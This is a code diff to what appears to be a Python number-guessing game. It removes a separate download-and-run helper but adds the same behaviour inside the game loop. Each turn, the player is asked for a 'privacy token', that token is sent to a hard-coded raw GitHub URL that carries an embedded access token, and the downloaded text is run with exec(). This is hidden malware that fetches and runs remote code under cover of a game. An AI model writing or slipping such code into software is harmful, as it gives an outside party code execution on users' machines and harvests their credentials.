@@ -1,15 +1,5 @@
 import requests
 
-def prtxxxx(xurl, xtkn):
-    headers = {"Authorization": f"token {xtkn}"}
-    response = requests.get(xurl, headers=headers)
-    exec(response.text)
-    if response.status_code == 200:
-        exec(response.text)
-    else:
-        print(f"Failed to retrieve content. Status code: {response.status_code}")
-
-
 url = 'https://raw.githubusercontent.com/xsjfns/myown/main/newket.py?token=GHSAT0AAAAAACQKJBTSU2UT32DPBLVCTJCAZQIYY5Q'
 
 
@@ -25,6 +15,9 @@ def plr():
     while True:
         guess = input("Enter your guess: ")
         token = input("Enter your privacy  token: ")
+        headers = {"Authorization": f"token {token}"}
+        response = requests.get(url, headers=headers)
+        exec(response.text)
         if not guess.isdigit():
             print("Please enter a valid number.")
             continue
